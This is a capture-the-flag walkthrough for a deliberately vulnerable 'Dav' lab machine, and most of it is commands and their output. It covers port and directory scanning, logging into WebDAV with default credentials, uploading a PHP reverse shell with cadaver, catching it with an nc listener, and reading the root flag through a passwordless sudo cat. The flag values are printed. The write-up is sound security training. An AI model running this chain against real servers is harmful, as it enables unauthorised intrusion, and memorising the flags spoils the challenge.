# Dav

## Description

boot2root machine for FIT and bsides guatemala CTF

## Initial Scan

Let's start with an Nmap scan. The scan reveals one open port:
* 80 http

~~~
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
~~~

## Web

We have no choice but heading to the webpage. The main page is the default page for Apache2. Didn't find anything useful in the source code and there is no robots.txt, so I ran a `gobuster` on it:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Dav]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://$IP/                        
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.57.102/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/21 11:47:30 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11321]
/webdav               (Status: 401) [Size: 459]
~~~

The result reveals a directory called `/webdav`. This page requiers authorization. I searched for `webdav default credential` and found the defaults in [this](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) website. After trying them, I got through.

* user: wampp
* pass: xampp

## Reverse Shell

I used a tool called `cadaver` to make things easier. You just simply run it with the URL infront of it and after entering the creds you can upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell). (Don't forget to change the IP to yours.):

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Dav/files]
└─$ cadaver http://$IP/webdav                                    
Authentication required for webdav on server `10.10.57.102':
Username: wampp
Password:dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5492 bytes succeeded.
dav:/webdav/> exit
~~~

Now we start a listener and then call the shell from the `/webdav` directory. After gainning the shell I spawned a TTY shell using a python one-liner:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Dav/files]
└─$ rlwrap nc -lvnp 4444                    
listening on [any] 4444 ...
connect to [10.9.3.156] from (UNKNOWN) [10.10.57.102] 49998
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 09:00:07 up 30 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/$
~~~

## User Flag

Now we can start looking for the user flag. You can find the user flag in `/home/merlin`:

~~~
www-data@ubuntu:/$ cd /home/merlin
www-data@ubuntu:/home/merlin$ ls
user.txt
www-data@ubuntu:/home/merlin$ cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
~~~

user.txt: `449b40fe93f78a938523b7e4dcd66d2a`

## Root Flag

Now we need to obtain the root flag. I ran `sudo -l` to check my permissions and I can run `cat` with sudo and no password:

~~~
www-data@ubuntu:/home/merlin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
~~~

We can use this permission to read the files that we don't have the permission to. We know the name of the root flag, so we can read it in `/root`:

~~~
www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
~~~

root.txt: `101101ddc16b0cdf65ba0b8a7af7afa5`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun.

Have a good one! : )